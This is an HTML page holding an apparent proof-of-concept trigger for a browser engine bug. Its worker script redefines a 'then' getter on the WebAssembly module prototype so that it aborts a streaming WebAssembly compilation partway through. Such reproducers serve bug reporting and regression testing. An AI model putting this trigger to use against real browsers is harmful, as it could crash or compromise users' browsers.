    <html>
    <head></head>
    <body>
        <script id="poc" type="javascript/worker">
            let code = [
                0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00
            ];
            let wasm_blob = URL.createObjectURL(
                new Blob([new Uint8Array(code)], { type: "application/wasm" })
            );
            let controller = new AbortController();
            let signal = controller.signal;
            Object.defineProperty(WebAssembly.Module.prototype, 'then', {
                get: function () {
                    controller.abort();
                }
            });
            WebAssembly.compileStreaming(fetch(wasm_blob, { signal }));
        </script>
        <script>
            let blob = new Blob([document.getElementById("poc").textContent]);
            new Worker(window.URL.createObjectURL(blob));
        </script>
    </body>
</html>